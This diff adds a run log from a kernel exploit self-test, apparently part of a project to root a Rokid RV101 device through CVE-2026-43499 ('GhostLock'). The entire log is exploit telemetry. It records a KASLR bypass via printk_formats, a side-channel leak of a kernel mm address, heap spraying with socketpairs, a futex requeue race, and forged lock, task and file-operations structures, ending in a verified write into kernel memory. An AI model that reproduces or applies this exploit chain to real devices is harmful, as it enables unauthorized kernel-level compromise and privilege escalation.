@@ -1,0 +1,87 @@
+=== GHOSTLOCK RUNLOG ===
+tag=selftest version=v957 ts=123538
+--- host time ---
+Sat Aug 22 12:35:38 PM CST 2026
+--- uptime before ---
+ 12:35:38 up 5 min,  0 users,  load average: 0.41, 0.40, 0.20
+--- loadavg before ---
+0.41 0.40 0.20 1/1272 3127
+--- nr_threads (field 4 total) ---
+running/total=1/1272
+--- meminfo head ---
+MemTotal:        1816600 kB
+MemFree:          182984 kB
+MemAvailable:     872856 kB
+Buffers:            5044 kB
+--- getenforce before ---
+Enforcing
+--- device binary sha1 ---
+2850496c18dc3ca5fa9340896d2110ef216e030e  /data/local/tmp/ghostlock_rv101
+--- local binary sha1 ---
+2850496c18dc3ca5fa9340896d2110ef216e030e  /home/kali/rokid_root/source_code/ghostlock_rv101/build/ghostlock_rv101
+--- environment ---
+--- command ---
+GL_PURGE_CNT=0\ GL_TAIL_KILLS=16\ GL_DUMMY_KILLS=0\ GL_SETUP_ATTEMPTS=1\ /data/local/tmp/ghostlock_rv101\ --selftest 
+=== RUN OUTPUT ===
+[+] ghostlock_rv101 v9.30 — CVE-2026-43499 (GhostLock) / Rokid RV101 1.22.009
+[+] startup: pid=3138 uid=2000 euid=2000 gid=2000
+[*] [T+305472ms] KASLR leak
+[*] printk_formats: "Rescheduling interrupts" -> 0xffffffd7a142ac0c slide=0x0000001797800000
+[*] printk_formats: "Function call interrupts" -> 0xffffffd7a14ca100 slide=0x0000001797800000
+[+] KASLR: slide=0x0000001797800000 base=0xffffffd79f800000 (2 anchors)
+[*] selftest run 1/1
+[*] === SELFTEST: write into sprayed page === target=0x0000000000000000 mode=3 delta=+0
+[*] v9.6 diag: flood clones ok=765 fail=0
+[*] kernelsnitch: baseline=5 threshold=50
+[*] v9.13 diag: dummy clones ok=450 fail=0 (first errno=0 Success)
+[*] v9.15 diag: purge clones ok=0 fail=0
+Threads:	4097
+[*]   collision[1]: 0000006e40f02010 (t=9452, ratio=1890)
+[*]   collision[2]: 0000006e40f72390 (t=9402, ratio=1880)
+[*]   collision[3]: 0000006e414f6fb0 (t=9347, ratio=1869)
+[*] kernelsnitch: top times: 9452 9402 9347 9 9 9 8 8
+[*] kernelsnitch child: 3/3 collisions
+[*] kernelsnitch: hashsize=1024 sz=0x3c0 single_matches=11804 mm=FOUND
+[*] kernelsnitch: elapsed 1731ms mm=ffffff806f77a1c0
+[*] leaked mm=ffffff806f77a1c0 slab base=ffffff806f778000
+[*] v9.14 settle[settle]: 37 rounds, o2=1101 objs=783 (quiet=20)
+[*] v9.10 gate: mm slabs 84 -> 83 objs 783 -> 667 (dip=1 calm=0)
+[*] v9.12 reclaim: o2 70 -> 2164 across full sequence (gate window 84 -> 2164, first-send=1)
+[*] v9.12 reclaim: 768/768 socketpairs, 768/768 SKB vehicles sent (15872 bytes each)
+[*] requeue ret=-1 errno=35
+[*] waiter wait_requeue_pi ret=-1 errno=110
+[*] pselect route target=ffffff806f779300 value=ffffff806f779500 mode=3 page=ffffff806f778000 fake_lock=ffffff806f778e00 fake_w0=ffffff806f779000 fake_task=ffffff806f779200 in=0000000000000000 out1=ffffff806f7792f9 out2=ffffff806f779500 out3=0000000000000000 out4=0000000000000001 ex0=0000000000000000 ex1=0000000000000000 ex2=ffffff806f779200 ex3=ffffff806f778e00 ex4=8000000000000082
+[*] pselect: calling select now (window 200000us, forged bytes resident)
+[*] consumer punch 1/5 (+20000us) tid=9101
+[*] consumer punch 1 returned ret=0 errno=0
+[*] consumer punch 2/5 (+55000us) tid=9101
+[*] consumer punch 2 returned ret=0 errno=0
+[*] consumer punch 3/5 (+90000us) tid=9101
+[*] consumer punch 3 returned ret=0 errno=0
+[*] consumer punch 4/5 (+125000us) tid=9101
+[*] consumer punch 4 returned ret=0 errno=0
+[*] consumer punch 5/5 (+160000us) tid=9101
+[*] consumer punch 5 returned ret=0 errno=0
+[*] pselect: select returned
+[*] pselect returned ret=0 errno=0 calls=5 success=5
+[*] punch_done=1 (waited 0 spins)
+[*] owner lock chain ret=0 errno=0
+[*] vehicle[130] diffs (offset: read vs pristine): 0e10:60/00 0e11:3c/90 0e12:be/77 0e13:23/6f 0e14:c0/80 1010:60/00 1011:3c/00 1012:be/00 1013:23/00 1014:c0/00 1015:ff/00 1016:ff/00 1017:ff/00 1018:18/00 1019:90/00 101a:77/00 101b:6f/00 101c:80/00 101d:ff/00 101e:ff/00 101f:ff/00 1301:95/00 1302:77/00 1303:6f/00 1304:80/00 1305:ff/00 1306:ff/00 1307:ff/00 1500:f9/00 1501:92/00 1502:77/00 1503:6f/00 1504:80/00 1505:ff/00 1506:ff/00 1507:ff/00 1a70:78/00 1a71:3c/00 1a72:be/00 1a73:23/00 1a74:c0/00 1a75:ff/00 1a76:ff/00 1a77:ff/00 1a78:78/00 1a79:3c/00 1a7a:be/00 1a7b:23/00 1a7c:c0/00 1a7d:ff/00 1a7e:ff/00 1a7f:ff/00 1a80:00/40 1a81:92/b8 1a82:77/9e 1a83:6f/a1 1a84:80/d7
+[*] vehicle[130]: n=15872 pad=0 child_pc=ffffff806f7792f9 w0_left=ffffffc023be3c60 w0_right=0000000000000000 lock_root=ffffff806f779000 lock_leftmost=ffffffc023be3c60 fake_task_usage=0000000000000100 scratch=ffffff806f779500 wait_lock=0000000000000000 owner=ffffff806f779201 pi_root=ffffffc023be3c78 pi_lm=ffffffc023be3c78
+[*] vehicle[130]: payload-view leftmost=ffffffc023be3c60 owner=ffffff806f779201 usage=0000000000000100
+[*] vehicle[130]: FAKE_FOPS owner=0000000000000000 llseek=ffffffd7a0a1ab88 read=ffffffd7a0a39168 write=0000000000000000 ioctl=ffffffd7a0a3e118 open=ffffffd7a0a3fb70
+[*] vehicle[130]: STRICT child_pc=OK scratch=OK (exp child_pc=ffffff806f7792f9 exp scratch=ffffff806f779500)
+[*] cleanup: 1 vehicle(s) with diffs, 1 with STRICT signature
+[+] SELFTEST: write into sprayed page verified: 1 vehicle(s) carried the STRICT walk signature (attempt 1)
+[*] selftest run 1/1 done (hit=1)  [1/1 hits so far]
+[+] SELFTEST summary: 1/1 runs hit the STRICT signature
+=== RUN DONE (pipe rc=0) ===
+--- host time ---
+Sat Aug 22 12:36:04 PM CST 2026
+--- adb device state ---
+device
+--- uptime after ---
+ 12:36:04 up 5 min,  0 users,  load average: 0.41, 0.40, 0.21
+--- getenforce after ---
+Enforcing
+--- log file: /home/kali/rokid_root/reports/ghostlock_runlogs/run_selftest_v957_123538.log ---
